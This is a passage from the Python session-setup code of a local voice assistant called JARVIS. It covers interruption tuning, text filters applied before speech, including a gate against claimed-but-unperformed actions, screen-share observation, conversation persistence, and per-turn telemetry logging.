                # STT-partial handler + kill-phrase handler own interruption
                # instead. Mirrors pipeline.echo_gate.enabled() (env
                # JARVIS_ECHO_AWARE_BARGEIN; '0' restores framework interruption).
                "enabled": os.environ.get("JARVIS_ECHO_AWARE_BARGEIN", "1") == "0",
                # ...but KEEP transcribing user audio while JARVIS speaks. The
                # framework's default DISCARDS STT when the current speech is
                # uninterruptible (agent_activity.push_audio → skip_stt), which
                # would starve the echo-aware STT-partial handler of the very
                # transcripts it needs to detect a real barge-in. Default True.
                "discard_audio_if_uninterruptible": False,
                # Mode 2026-05-18: explicit "vad" rather than absent
                # (auto-detect). Absent would try AdaptiveInterruption
                # via livekit.cloud/agent-gateway first — JARVIS runs
                # local LiveKit (LIVEKIT_URL=ws://127.0.0.1:7880) and
                # has no Cloud inference key, so the auto-detect probe
                # fails silently and falls back to VAD anyway. Setting
                # explicitly avoids the wasted probe and makes intent
                # clear. Switch to "adaptive" only if/when JARVIS moves
                # to LiveKit Cloud or self-hosts agent-gateway.
                "mode": "vad",
                # min_words and min_duration are AND-gated in the
                # framework: interrupt fires only after VAD has crossed
                # min_duration AND STT has produced ≥ min_words words.
                # NOTE: this is the boot-time default. Per-route values
                # in pipeline/turn_router.py::_ROUTE_BASE override per
                # turn (BANTER=1, TASK=3, REASONING=3, EMOTIONAL=3).
                # History on this knob:
                #   - min_words=1 added ~550–800 ms before barge-in
                #     fired (Whisper partial transcript latency on top
                #     of the VAD window). Felt laggy.
                #   - VAD-only (min_words=0) was instant but killed
                #     replies on any 400 ms of room noise — verified
                #     2026-04-28 when "Anyway, bro" cut the screenshot
                #     description mid-utterance.
                #   - min_words=2: filtered single-word bursts ("yeah",
                #     "uh", "no") but 2-word backchannels ("yeah okay"
                #     / "got it" / "mhm okay") still killed TTS — live
                #     2026-05-07.
                #   - min_words=3 (current TASK base): also filters
                #     2-word backchannels. Adds ~200 ms latency to
                #     deliberate 2-word interrupts; kill-phrase fast-
                #     path at line 7410 covers single-word "stop"/
                #     "wait"/"cancel" past min_words.
                "min_duration": 0.4,
                "min_words": 3,
                # resume_false_interruption / false_interruption_timeout
                # OFF on purpose. Why: the framework's "false interrupt"
                # path replaces the real interrupt() with audio_output
                # .pause() (agent_activity.py:1628). For the LiveKit
                # ParticipantAudioOutput, pause() only gates new frames
                # — it does NOT clear the SFU-side AudioSource queue
                # (room_io/_output.py:129-132 has the clear_queue line
                # commented out). With Groq Orpheus pushing the whole
                # utterance to the SFU in well under a second, by the
                # time pause fires the audio is already buffered at the
                # SFU and plays to the end. That was the "JARVIS keeps
                # talking until he's done" symptom. Disabling pause
                # routes every barge-in straight to interrupt() →
                # clear_buffer() → clear_queue(), which actually drops
                # the in-flight audio. Cost: a cough silences JARVIS
                # without auto-resume; user re-asks. Mild vs. the prior
                # "can't interrupt" UX.
                "resume_false_interruption": False,
                "false_interruption_timeout": None,
            },
            "endpointing": {
                # How long after the user stops talking before we
                # treat the turn as complete and fire the LLM.
                # Slightly tighter than default reduces dead-air
                # without cutting off mid-thought pauses.
                "min_delay": 0.4,
                "max_delay": 4.0,
            },
            "preemptive_generation": {
                # Disabled because llama-3.3-70b on Groq emits
                # malformed function calls under preemptive generation
                # with our 3-tool setup — the LLM tries to commit to
                # a tool call before the user finishes speaking, the
                # call is malformed, Groq returns "Failed to call a
                # function", retries exhaust, and the user gets total
                # silence + a permanently-amber tray. Cleaner to wait
                # for the full user turn and pay the ~200 ms.
                "enabled": False,
            },
        },
        # Note: use_tts_aligned_transcript was removed — the Groq
        # Orpheus TTS plugin doesn't return aligned transcripts, so
        # turning it on just spammed warnings. The DB still gets the
        # whole intended utterance, which is fine for recall.
        #
        # tts_text_transforms — keep the framework defaults
        # (filter_markdown, filter_emoji) AND prepend our own filter
        # that strips raw function-call markup that llama-3.3 sometimes
        # emits as text instead of structured tool_calls. Without this
        # the TTS voices "function run_jarvis_cli request open Chrome"
        # which sounds completely broken.
        tts_text_transforms=[
            # Phase-7 TTFW: time the FIRST non-empty chunk leaving
            # the LLM stream. Must be first so hedge-drop / preamble-
            # strip don't mask the early tokens.
            stamp_first_token,
            # Pre-TTS confab gate (2026-05-24) — buffer the FULL LLM text
            # stream and inspect for "no-tool but claimed action" confabs;
            # run the per-route retry ladder on trip and replace text
            # before downstream filters / TTS see it. Must sit AFTER
            # stamp_first_token (which only timestamps; doesn't buffer)
            # so TTFW telemetry stays accurate. The 800ms front-loaded
            # ack (in _on_agent_state) cushions the buffering latency.
            # Kill switch: JARVIS_PRE_TTS_CONFAB_GATE=0.
            pre_tts_confab_gate_filter,
            # Ambient-backchannel suppressor (2026-07-02): a reply that is
            # ONLY a filler token ("Right." / "Mm." / "Yes?") answering a
            # turn not addressed to JARVIS is silenced — soul.md DISCRETION
            # enforced in code. Non-thinking pinned models voice fillers at
            # the room and each committed one teaches the next (live: 0%→81%
            # of turns in one session). After the confab gate so it sees the
            # final text; before the strippers. Bare "Jarvis" → "Yes?" and
            # mid-conversation continuers to ADDRESSED talk pass untouched.
            # Kill switch: JARVIS_BACKCHANNEL_GATE=0.
            suppress_ambient_backchannel,
            strip_function_call_leakage,
            # 2026-07-01: drop `*(chuckles)*`-style stage-direction
            # emotes + stray markdown, and NEVER emit a letterless
            # reply. A bare `*` reaching Kokoro pushes zero audio
            # frames → APIError → FallbackAdapter marks the primary
            # TTS unavailable → voice flips to EdgeTTS + retry stalls,
            # and the truncated `*(` husk committed to chat_ctx taught
            # the LLM to emit more emotes. Captured live with pinned
            # deepseek-v4-flash.
            strip_emote_markup,
            # Strip "Done.", "Anything else?", "Happy to help", etc.
            # gpt-oss-120b habitually appends these despite the system
            # prompt forbidding them; cheaper to peel post-LLM than to
            # swap to a smaller model. Verified 2026-04-28 vs convo db
            # (the user heard "Done." as a trailing dot).
            strip_voice_closers,
            # 2026-05-04: drop "Silence." / "Just listening." class
            # of meta-acknowledgments. Saying you're being silent IS
            # speaking. The system prompt forbids this; the filter is a
            # safety net for when the LLM does it anyway. Only fires
            # when the WHOLE buffered reply matches — never trims mid-
            # sentence content like "the silence was deafening."
            strip_meta_silence,
            # 2026-05-04: trim archaic openers ("Indeed.", "Quite,",
            # "Splendid.", "Very well.") off the START of replies. The
            # user finds the British-butler register grating. Prompt
            # bans them; this filter is the deterministic backstop.
            # Mid-sentence occurrences ("quite simple", "I see why")
            # are preserved.
            strip_archaic_openers,
            # NOTE 2026-04-30: drop_pure_hedge removed. The post-LLM
            # hedge filter ate legitimate replies like 'I'm here.'
            # Replaced by the upstream STT-confidence gate in
            # JarvisAgent.on_user_turn_completed which drops obvious-
            # garbage transcripts BEFORE the LLM is called — cheaper
            # and less ambiguous than filtering open-ended LLM prose.
            # Cut "Let me check...", "I'll fetch...", "Checking the
            # internet...", "Okay, I have..." filler. Heard 2026-04-28:
            # 5-clause preamble before "the time is X" added 15s of speech.
            strip_preambles,
            # Convert "4 000" → "4,000" so TTS reads "four thousand"
            # instead of mispronouncing as "forty" or "four-oh".
            normalize_numbers,
            # Strip ALL "sir" from voiced replies — safety net for the
            # drop-butler-register policy (2026-05-09). gpt-oss-120b
            # learned-habit filter.
            cap_sir_count,
            "filter_markdown",
            "filter_emoji",
        ],
    )

    # Per-session conversation id for persistence to conversations.db.
    # Stored on the session object so on_enter / on_exit / _on_item can
    # read it without threading it through every call site.
    convo_session_id = str(uuid.uuid4())
    session._jarvis_convo_session_id = convo_session_id
    logger.info(f"[session] {convo_session_id} — conversation persisted to conversations.db")

    # Per-session language context — tracks detected language + confidence
    # from STT events so DispatchingTTS can pick the matching voice per turn.
    # Default is 'en'; updated live by _update_lang_from_stt_event inside
    # the user_input_transcribed handler.
    session._jarvis_lang_ctx = LangContext()

    # Session-state for the dispatcher prefix. Turn count drives the
    # [Turn N · session Mm] hint that tells the LLM where it is in the
    # conversation, so it can reference earlier exchanges proactively
    # instead of asking for context already given.
    session._jarvis_turn_count    = 0
    session._jarvis_session_start = time.monotonic()

    # Phase 10.3 — acoustic prosody. Subscribe to the user's audio
    # track on the room and maintain a rolling RMS dB buffer. The
    # tap waits for track_subscribed events, so attaching here is
    # safe regardless of whether the user joined before or after us.
    try:
        from pipeline.prosody import AcousticTap
        _tap = AcousticTap()
        _tap.attach_to_room(ctx.room)
        session._jarvis_acoustic_tap = _tap
    except Exception as e:
        logger.warning(f"[acoustic-tap] init failed: {e}")
        session._jarvis_acoustic_tap = None

    # Partial-word barge-in tap (2026-07-02) — free local replacement for
    # Deepgram streaming partials. A CPU Vosk recognizer listens ONLY
    # while JARVIS speaks and interrupts on NOVEL partial words (~0.3-0.4s
    # after voice onset; probe-verified), through the same echo_gate the
    # finals-based layer uses. Whisper stays the turn STT; Vosk text never
    # enters chat history. Kill-switch JARVIS_PARTIAL_BARGEIN=0; degrades
    # to finals-only barge-in if vosk/model absent.
    try:
        from pipeline.bargein_tap import PartialBargeInTap

        def _partial_bargein_interrupt(partial: str) -> None:
            # force: speeches are non-interruptible in echo-aware mode —
            # mirrors the kill-phrase + echo-bargein handlers.
            session.interrupt(force=True)
            _cancel_thinking_heartbeat(session)
            session._jarvis_was_interrupted = True

        _pb_tap = PartialBargeInTap(
            session=session, on_interrupt=_partial_bargein_interrupt
        )
        # v2: frames arrive via the JarvisAgent.stt_node tee (a second
        # rtc.AudioStream starved after ~1 s live); start() spins the
        # recognition worker only.
        _pb_tap.start()
        session._jarvis_partial_bargein_tap = _pb_tap
    except Exception as e:
        logger.warning(f"[partial-bargein] init failed: {e}")

    # LiveKit screen-share consumer. Whenever the voice-client publishes
    # its SOURCE_SCREENSHARE track, this sink decodes the latest frame
    # to JPEG and parks it on `session._jarvis_latest_screen_frame`.
    # tools.computer_use._take_screenshot prefers the cached frame if
    # it's <2 s old, so "what's on my screen?" doesn't pay scrot's
    # ~150 ms PNG-encode round-trip while the screen-share is active.
    try:
        from pipeline import screen_share_sink
        screen_share_sink.attach_to_room(ctx.room, session)
    except Exception as e:
        logger.warning(f"[screen-share-sink] init failed: {e}")

    # Continuous screen-share observer. Polls vision_describe() every
    # JARVIS_SCREEN_OBSERVER_INTERVAL_S (default 5s) while the
    # screen-share track is active and caches the latest description on
    # session._jarvis_latest_screen_description. The screenshot() tool
    # checks that cache first — when it's fresh, the user's "what's on
    # my screen?" returns in ~0s instead of paying the ~4s Gemini
    # round-trip. Designed 2026-05-11 evening after Gemini Live API
    # smoke-test showed no advantage over polling for our intermittent-
    # query pattern. Toggle via JARVIS_SCREEN_OBSERVER_ENABLED=0.
    try:
        from pipeline import screen_share_observer
        screen_share_observer.attach_to_room(ctx.room, session)
    except Exception as e:
        logger.warning(f"[screen-observer] init failed: {e}")

    # Bind the session for the stamp_first_token TTS filter (Phase 7).
    # The filter list was built at session-construction time and can't
    # reach back into the session via closure capture; this container
    # gives it late-bound access for true TTFW measurement.
    _active_session_for_telemetry[0] = session

    # Trim chat_ctx after every assistant turn so long sessions don't
    # blow past Groq's context window. Keep the most recent CTX_MAX_TURNS
    # message objects (user+assistant pairs → 80 items ≈ 40 exchanges).
    # Trim only on assistant turns so we never cut a pair mid-exchange.
    CTX_MAX_TURNS = 80

    @session.on("conversation_item_added")
    def _on_item(ev) -> None:
        try:
            item = ev.item
            role = getattr(item, "role", None)
            text = _flatten_chat_content(getattr(item, "content", None))
            # Barge-in truncation gate: if this assistant turn was
            # interrupted, rewrite item.content + the saved text to only
            # the heard portion (OpenAI Realtime parity). Spec:
            # docs/superpowers/specs/2026-05-07-barge-in-truncation-design.md
            if role == "assistant" and getattr(session, "_jarvis_was_interrupted", False):
                audio_end_ms = getattr(session, "_jarvis_agent_audio_ms_acc", 0) or 0
                # Fold in the open speaking-segment delta — barge-in fires
                # while we're still in "speaking", and the accumulator is
                # only flushed on speaking→not-speaking. Without this, the
                # truncation under-reports heard duration on the very path
                # this feature targets. Matches the same correction in the
                # log_turn block below.
                _spk_start = getattr(session, "_jarvis_agent_speaking_started_at", None)
                if _spk_start is not None:
                    audio_end_ms += int((time.monotonic() - _spk_start) * 1000)
                table = getattr(session, "_jarvis_tts_position_table", None) or []
                original_len = len(text or "")
                truncated, mutated = _truncate_to_heard_portion(item, table, audio_end_ms)
                if mutated:
                    text = truncated
                    logger.info(
                        "[barge-in] truncated assistant turn %d→%d chars at audio_end_ms=%d",
                        original_len, len(text), audio_end_ms,
                    )
            # Mirror assistant turns to the LiveKit data channel for
            # subscribers like the tray chat panel. Idempotent; no-ops
            # for user turns + empty text. Fire-and-forget — the helper
            # swallows publish errors.
            asyncio.create_task(
                maybe_publish_assistant_says(
                    room=ctx.room, item=item, role=role, text=text,
                )
            )
            # Background sync to the cloud memory provider (no-op when the
            # layer is off — JARVIS_MEMORY_PROVIDER unset → sync_item_async
            # returns immediately). Reuses this handler's already-extracted
            # `role` + `text` (truncated heard-portion for interrupted
            # assistant turns), fire-and-forget so it never blocks the turn.
            try:
                from pipeline import memory_provider
                _mem_role = role or ""
                # Gate: skip non-conversation roles, empty text, AND anything
                # while silenced — a voice-muted JARVIS must not keep feeding
                # honcho's deriver (2026-06-18 silent-mode token-leak fix).
                if _should_sync_memory_item(_mem_role, text):
                    memory_provider.sync_item_async(_mem_role, text)
            except Exception:
                pass
            # Dispatcher-independent turn tracking for conversations.db.
            # Each user item = a new turn. The dispatcher's
            # _jarvis_turn_count / _jarvis_turn_user_text only update in
            # its swap paths, which never run when the dispatcher is
            # skipped (pin + JARVIS_PIN_ALL_ROUTES=1, or
            # JARVIS_DISPATCH_DISABLED=1) — the 2026-07-01 "sessions
            # titled but zero messages" outage. See _convo_turn_seq.
            if role == "user" and (text or "").strip():
                try:
                    session._jarvis_convo_seq = (
                        int(getattr(session, "_jarvis_convo_seq", 0) or 0) + 1
                    )
                    session._jarvis_convo_user_text = text
                except Exception:
                    pass
            if role == "assistant":
                _bump_turn_activity(session)  # assistant reply landed = turn progress

                # ── Persist this turn to conversations.db (fire-and-forget) ──
                # Both user and assistant messages are written here, keyed by
                # (session_id, role, turn_sequence). The UNIQUE constraint in
                # the messages table makes this idempotent — if the assistant
                # branch fires multiple times per turn (interstitial items),
                # the second write is silently dropped.
                try:
                    from pipeline import conversation_store
                    sid = getattr(session, "_jarvis_convo_session_id", None)
                    if sid:
                        # Dispatcher-independent seq/user-text (2026-07-01
                        # outage fix) — see _convo_turn_seq for the why.
                        turn_n = _convo_turn_seq(session)
                        if turn_n > 0:
                            # User message
                            user_text_val = _convo_user_text(session)
                            if user_text_val.strip():
                                conversation_store.log_turn(
                                    session_id=sid,
                                    role="user",
                                    text=user_text_val,
                                    turn_sequence=turn_n,
                                )
                            # Assistant message
                            text_val = text or ""
                            if text_val.strip():
                                tc_json = None
                                raw_tc = (
                                    getattr(
                                        session, "_jarvis_tool_calls_this_turn", None
                                    )
                                    or []
                                )
                                if raw_tc:
                                    import json as _json_tc
                                    try:
                                        tc_json = _json_tc.dumps(raw_tc)
                                    except Exception:
                                        pass
                                conversation_store.log_turn(
                                    session_id=sid,
                                    role="assistant",
                                    text=text_val,
                                    turn_sequence=turn_n,
                                    tool_calls_json=tc_json,
                                )
                except Exception:
                    pass
                # ── End conversation persistence ─────────────────────────

                # Use the pure classifier to decide what kind of
                # assistant item this is and how to handle it:
                #   final_reply / benign_empty → cancel heartbeat (turn done)
                #   silent_failure → fire text recovery; recovery's voiced
                #                    output later lands as ANOTHER item that
                #                    classifies as final_reply, cancelling
                #                    the heartbeat then
                #   interstitial   → keep heartbeat running (more LLM iterations
                #                    coming after the tool batch lands)
                try:
                    from pipeline.text_recovery_detect import classify_assistant_item
                    had_tools = bool(
                        getattr(session, "_jarvis_tool_calls_this_turn", None) or []
                    )
                    cls = classify_assistant_item(
                        content=getattr(item, "content", None),
                        had_prior_tool_calls=had_tools,
                    )
                except Exception as _e:
                    logger.debug(f"[heartbeat] classify skipped: {_e}")
                    cls = "final_reply"  # fail open — cancel heartbeat

                if cls in ("final_reply", "benign_empty"):
                    _cancel_thinking_heartbeat(session)
                elif cls == "silent_failure":
                    # DON'T cancel heartbeat yet — recovery produces a
                    # follow-up assistant item; that one classifies as
                    # final_reply and cancels the heartbeat.
                    asyncio.create_task(_post_turn_text_recovery(session))
                # else cls == "interstitial" → keep heartbeat running.
                # Auto-flip silent mode when the model voiced a mute
                # confirmation but the gate didn't trigger (e.g. user
                # said "Go on mute" without a vocative — gate rejects,
                # but the LLM correctly inferred the intent and replied
                # "Going quiet"). Honor the LLM's interpretation so
                # behavior matches what was acknowledged out loud.
                #
                # Anti-hallucination guard (2026-05-04): if the most
                # recent USER message matched a wake pattern, do NOT
                # auto-mute — JARVIS hallucinating "going quiet" in
                # response to "wake up" was the live-observed cascade
                # that re-muted him right after waking up. The user's
                # intent ("be active") wins over the LLM's confused
                # text.
                lower = (text or "").lower()
                if not _is_silent() and any(p in lower for p in (
                    "going quiet", "going silent", "muting myself",
                    "going to sleep", "i'll be quiet", "be quiet now",
                )):
                    # Find the most recent user turn in `prior`.
                    last_user_text = ""
                    for prev in reversed(prior):
                        if getattr(prev, "role", None) == "user":
                            last_user_text = (
                                _flatten_chat_content(getattr(prev, "content", None)) or ""
                            ).lower()
                            break
                    user_just_woke_jarvis = bool(last_user_text) and any(
                        p.search(last_user_text) for p in _WAKE_PATTERNS
                    )
                    if user_just_woke_jarvis:
                        logger.warning(
                            "[silent-mode] auto-mute SUPPRESSED — assistant text "
                            "%r looks like a mute, but the user just woke JARVIS "
                            "(%r). Hallucination guard.",
                            text[:80], last_user_text[:80],
                        )
                    else:
                        _set_silent(True)
                        logger.info(f"[silent-mode] auto-engaged from assistant text: {text[:80]!r}")
                # Maya-class telemetry: log turn outcome to SQLite.
                # Phase 10.4 — write unconditionally. The previous
                # `_dispatch_llm is not None` gate dropped every row when
                # JARVIS_DISPATCH_DISABLED=1, leaving the bypass case
                # invisible in the report. We just fall back to direct
                # session-config reads for llm_used / voice_used in that
                # case, since the dispatcher's `last_*` fields are the
                # only thing the gate was protecting.
                try:
                    start = getattr(session, "_jarvis_turn_start_monotonic", None)
                    # Phase-7 TTFW: prefer the first-token timestamp
                    # stamped by the stamp_first_token TTS filter (true
                    # latency from STT-final to first audible word).
                    # Fall back to "assistant message landed in
                    # chat_ctx" timing only if the filter didn't fire
                    # (e.g. an empty / hedge-dropped reply).
                    first_tok = getattr(session, "_jarvis_first_token_at_monotonic", None)
                    if start and first_tok and first_tok >= start:
                        ttfw_ms = int((first_tok - start) * 1000)
                    elif start:
                        ttfw_ms = int((time.monotonic() - start) * 1000)
                    else:
                        ttfw_ms = 0
                    # Clamp zombie values >60s to NULL — sometimes a
                    # rejected turn (silent-mode, garbage gate, short
                    # input) leaves the start-monotonic set so the NEXT
                    # turn inherits the stale start. Global review §P0-15
                    # found three telemetry rows with TTFW >1M ms from
                    # this exact bug. Clear after write (below) closes
                    # the loop; this clamp protects the column shape.
                    if ttfw_ms > 60_000:
                        ttfw_ms = None
                    # Capture subagent BEFORE clearing — read once,
                    # then None-out so the next turn doesn't reuse a
                    # stale value when the supervisor handles it
                    # directly (no handoff).
                    subagent = getattr(session, "_jarvis_last_subagent", None)
                    if _dispatch_llm is not None:
                        # Prefer the turn-local label stamped on the
                        # session at swap time. _dispatch_llm.last_llm_label
                        # is a shared mutable attr that races across async
                        # turns + survives reconnect rebuilds, so it logged
                        # stale BANTER (8b) labels on TASK turns (2026-05-20).
                        llm_used = (
                            getattr(session, "_jarvis_llm_label", None)
                            or _dispatch_llm.last_llm_label
                        )
                        voice_used = _dispatch_tts.last_voice_id
                    else:
                        llm_used = active_speech_id
                        voice_used = "fallback-chain"
                    interrupted_flag = bool(
                        getattr(session, "_jarvis_was_interrupted", False)
                    )
                    # Pull pre-flight estimate stashed by
                    # _BreakeredGroqLLM.chat() for the supervisor's
                    # turn. Cost is best-effort: if the LLM stream
                    # exposed a `usage` field we use those exact
                    # token counts; otherwise we fall back to the
                    # estimate for input and leave output as None
                    # (cost stays NULL — won't pollute the avg).
                    try:
                        from tools.token_estimation import cost_usd as _cost_usd
                    except Exception:
                        _cost_usd = None
                    in_est = _LAST_PREFLIGHT.get("tokens")
                    pressure = _LAST_PREFLIGHT.get("pressure")
                    # Exact token counts from session.last_usage if
                    # the framework stashed them; otherwise None.
                    exact_in = getattr(session, "_jarvis_last_input_tokens", None)
                    exact_out = getattr(session, "_jarvis_last_output_tokens", None)
                    in_tok = exact_in if exact_in is not None else in_est
                    out_tok = exact_out
                    cost = None
                    if _cost_usd is not None and in_tok is not None and out_tok is not None and llm_used:
                        try:
                            cost = _cost_usd(llm_used, in_tok, out_tok)
                        except Exception:
                            cost = None
                    # total_audio_ms — sum of all "speaking" segments in
                    # this turn, accumulated by _on_agent_state.
                    audio_ms_acc = getattr(session, "_jarvis_agent_audio_ms_acc", 0) or 0
                    # If we're still in "speaking" when log_turn fires
                    # (rare — interrupt path lands here), capture the
                    # partial segment too.
                    spk_start = getattr(session, "_jarvis_agent_speaking_started_at", None)
                    if spk_start is not None:
                        audio_ms_acc += int((time.monotonic() - spk_start) * 1000)
                    # memory_auto_extracted: always False since 2026-05-21 —
                    # the per-turn memory auto-extractor was retired when
                    # JARVIS swapped to the file-backed, deliberate-writes
                    # memory model. Memory is now written via the `memory`
                    # tool, which lands a structured tool_result in chat_ctx
                    # (that's what backs a "saved" claim for the confab
                    # detector now — no separate extractor-evidence signal).
                    # The column is retained for schema stability.
                    mem_extracted = False
                    cache_read = getattr(session, "_jarvis_last_cache_read_tokens", 0) or 0
                    cua_steps = getattr(session, "_jarvis_last_cua_steps", None)
                    cua_cost = getattr(session, "_jarvis_last_cua_cost", None)
                    # Browser-backend telemetry — always None in this build.
                    # The browser subagent (which stashed 'ext'/'cdp' here)
                    # was removed in the subagent teardown; the log_turn
                    # column is retained for schema stability and will be
                    # repopulated when a browser tool is re-ported.
                    browser_backend_used: Optional[str] = None
                    # T11 (2026-05-19) — confab_check_state per-turn audit.
                    # Computed BEFORE log_turn so spec acceptance A5
                    # ("confab_check_state queryable on every turn written
                    # post-fix") is satisfied. 5-way enum per spec §5.4.
                    # Failures swallowed silently — telemetry is best-
                    # effort and must never block the user-facing path.
                    #
                    # Source-of-truth precedence (2026-05-24): when the
                    # pre-TTS confab gate fired this turn it has already
                    # stamped session._jarvis_confab_check_state with a
                    # CONFAB_STATE_* value ("clean" / "caught_t1_passed" /
                    # …). Prefer that verdict — it reflects the actual
                    # decision the gate made BEFORE TTS streamed. Fall
                    # back to the post-hoc evidence check when the gate
                    # didn't fire (kill switch active, bypass route, or
                    # the filter wasn't reached).
                    _pre_tts_state = getattr(
                        session, "_jarvis_confab_check_state", None
                    )
                    if _pre_tts_state:
                        _confab_state = _pre_tts_state
                    else:
                        try:
                            _confab_state = compute_confab_check_state(
                                session=session,
                                chat_items=getattr(
                                    getattr(session, "chat_ctx", None), "items", []
                                ) or [],
                                jarvis_text=text or "",
                            )
                        except Exception:
                            _confab_state = None
                    # Pre-TTS gate observability columns. The gate stashes
                    # pattern_matched (regex source string) + retry_models
                    # (list[str]) on the session inside the filter; flush
                    # them here on turn boundary. JSON-encode the list so
                    # the column type stays TEXT. NULL on turns where the
                    # gate didn't fire or was bypassed.
                    _pattern_matched = getattr(
                        session, "_jarvis_confab_pattern_matched", None
                    )
                    # Discriminate "gate fired" vs "gate didn't fire" via
                    # `_pattern_matched` rather than via truthiness on the
                    # retry list. The session boots + user-turn-start resets
                    # both leave the list at `[]`, so a truthiness check
                    # would conflate "gate fired and exhausted the retry
                    # chain (empty trace)" with "gate didn't fire". Pattern
                    # is None on both "gate didn't fire" AND clean-pass
                    # paths (line 3379), so NULL here matches "no actionable
                    # retry data to record" — gate-fired turns get either
                    # `[<model_ids>]` or `[]`, both meaningful and JSON-
                    # encoded.
                    _retry_models_raw = getattr(
                        session, "_jarvis_confab_retry_models", None
                    )
                    if _pattern_matched is None or _retry_models_raw is None:
                        _retry_models_json = None
                    else:
                        import json as _json_telemetry
                        try:
                            _retry_models_json = _json_telemetry.dumps(
                                list(_retry_models_raw)
                            )
                        except Exception:
                            _retry_models_json = None
                    # 2026-05-19 — read the voice-client's AEC state (cross-process)
                    # and thread it into the turn row. Stale/missing → NULLs.
                    try:
                        from audio.aec_state import read_aec_state
                        _aec = read_aec_state(max_age_s=60)
                    except Exception:
                        _aec = {}
                    # Memory learning-loop telemetry (2026-06-21): the
                    # save_trigger_fired / recall_trigger_fired columns existed
                    # in the schema but NOTHING ever wrote them (same dead-column
                    # bug class as total_audio_ms=0). Derive them from this turn's
                    # tool calls so we can finally SEE whether capture/recall is
                    # firing — the prerequisite for knowing if JARVIS is learning.
                    _save_fired = False
                    _recall_fired = False
                    try:
                        import json as _json_mem
                        for _tc in (
                            getattr(session, "_jarvis_tool_calls_this_turn", None) or []
                        ):
                            _tname = (
                                getattr(_tc, "name", None)
                                or (_tc.get("name") if isinstance(_tc, dict) else "")
                                or ""
                            )
                            if _tname in ("recall", "recall_conversation"):
                                _recall_fired = True
                            elif _tname == "memory":
                                _raw = getattr(_tc, "arguments", None)
                                if isinstance(_tc, dict):
                                    _raw = _tc.get("arguments", _raw)
                                try:
                                    _parsed = (
                                        _json_mem.loads(_raw)
                                        if isinstance(_raw, str)
                                        else (_raw or {})
                                    )
                                    _action = str(_parsed.get("action", "")).lower()
                                except Exception:
                                    _action = ""
                                # add/replace = a save; read/remove ≠ capture.
                                # Unknown action (parse failed) counts as a save —
                                # better to over- than under-report the loop firing.
                                if _action in ("add", "replace", ""):
                                    _save_fired = True
                    except Exception:
                        pass
                    log_turn(
                        user_text=getattr(session, "_jarvis_turn_user_text", "") or "",
                        jarvis_text=text or "",
                        emotion=getattr(session, "_jarvis_emotion", None),
                        route=getattr(session, "_jarvis_route", None),
                        llm_used=llm_used,
                        voice_used=voice_used,
                        ttfw_ms=ttfw_ms,
                        total_audio_ms=audio_ms_acc,
                        user_followup_30s=False,  # backfilled at report-time
                        route_fallback=False,
                        subagent=subagent,
                        interrupted=interrupted_flag,
                        input_tokens=in_tok,
                        output_tokens=out_tok,
                        cost_usd=cost,
                        context_pressure=pressure,
                        memory_auto_extracted=mem_extracted,
                        save_trigger_fired=_save_fired,
                        recall_trigger_fired=_recall_fired,
                        prompt_cached_tokens=cache_read,
                        browser_backend=browser_backend_used,
                        computer_use_steps=cua_steps,
                        computer_use_cost_usd=cua_cost,
                        confab_check_state=_confab_state,
                        confab_pattern_matched=_pattern_matched,
                        confab_retry_models=_retry_models_json,
                        subagent_type=getattr(session, "_jarvis_subagent_type", None),
                        subagent_ms=getattr(session, "_jarvis_subagent_ms", None),
                        subagent_status=getattr(session, "_jarvis_subagent_status", None),
                        user_lang=session._jarvis_lang_ctx.get(),
                        aec_layer1_active=_aec.get("aec_layer1_active"),
                        aec_layer2_aec_active=_aec.get("aec_layer2_aec_active"),
                        aec_layer3_active=_aec.get("aec_layer3_active"),
                        output_profile=_aec.get("output_profile"),
                        apm_delay_ms_p50=_aec.get("apm_delay_ms_p50"),
                        dtln_latency_ms_p95=_aec.get("dtln_latency_ms_p95"),
                    )
                    # ── Autonomous self-improvement loop (fire-and-forget) ──
                    # Mirrors the upstream "background review thread that
                    # auto-writes after a turn" on JARVIS's async substrate.
                    # The memory extractor fires the same way in
                    # on_user_turn_completed (create_task, never awaited);
                    # this fires the SKILL review + the interval-gated curator
                    # here — the turn row was just written above, so we have
                    # the full just-completed turn (user text + reply + route
                    # + subagent + computer_use steps) to review.
                    #
                    # MUST be off the latency path: TTS has already streamed
                    # by the time this assistant-turn-landed handler runs, and
                    # fire_self_improvement schedules background tasks and
                    # returns immediately (never awaited). The whole call is
                    # try/except'd here AND internally so a review failure can
                    # never break the turn. Hard-turn gate + validators +
                    # junk-filter live inside the engine. Master kill switch:
                    # JARVIS_SELF_IMPROVE_DISABLED=1.
                    try:
                        from pipeline.skill_review import (
                            TurnSnapshot as _TurnSnapshot,
                            fire_self_improvement as _fire_self_improvement,
                        )

                        _fire_self_improvement(_TurnSnapshot(
                            turn_id=0,  # live turn — content carried directly
                            ts_utc="",
                            user_text=(
                                getattr(session, "_jarvis_turn_user_text", "")
                                or ""
                            ),
                            jarvis_text=text or "",
                            route=(getattr(session, "_jarvis_route", None) or ""),
                            subagent=(subagent or ""),
                            computer_use_steps=int(cua_steps or 0),
                            tool_call_count=len(
                                getattr(session, "_jarvis_tool_calls_this_turn", None) or []
                            ),
                            had_tool_error=bool(
                                getattr(session, "_jarvis_had_tool_error_this_turn", False)
                            ),
                        ))
                    except Exception as _sie:
                        logger.debug(
                            f"[skill_review] fire wiring skipped: {_sie}"
                        )
                    # Spec 2026-05-24, Track 2.5 — end-of-turn procedure
                    # capture offer. If the just-completed turn looks like
                    # a successful multi-step task, append a one-line offer
                    # so the user can save the trajectory as a named procedure.
                    if os.environ.get("JARVIS_PROCEDURE_CAPTURE_DISABLED", "0") != "1":
                        try:
                            from pipeline.skill_review import (
                                _is_successful_trajectory,
                                TurnSnapshot as _PCTS,
                            )
                            _turn_start_mono = getattr(
                                session, "_jarvis_turn_start_monotonic", None
                            )
                            wall_clock_s = float(
                                (time.monotonic() - _turn_start_mono)
                                if _turn_start_mono is not None
                                else 0.0
                            )
                            user_text_for_gate = (
                                getattr(session, "_jarvis_turn_user_text", "") or ""
                            )
                            _snap_for_gate = _PCTS(
                                turn_id=0, ts_utc="",
                                user_text=user_text_for_gate,
                                jarvis_text=text or "",
                                route=(getattr(session, "_jarvis_route", None) or ""),
                                subagent=(subagent or ""),
                                computer_use_steps=int(cua_steps or 0),
                                tool_call_count=int(_tool_calls_this_turn or 0),
                                had_tool_error=bool(
                                    getattr(session, "_jarvis_had_tool_error_this_turn", False)
                                ),
                            )
                            if _is_successful_trajectory(_snap_for_gate, wall_clock_s, 0):
                                name = _derive_procedure_name(user_text_for_gate)
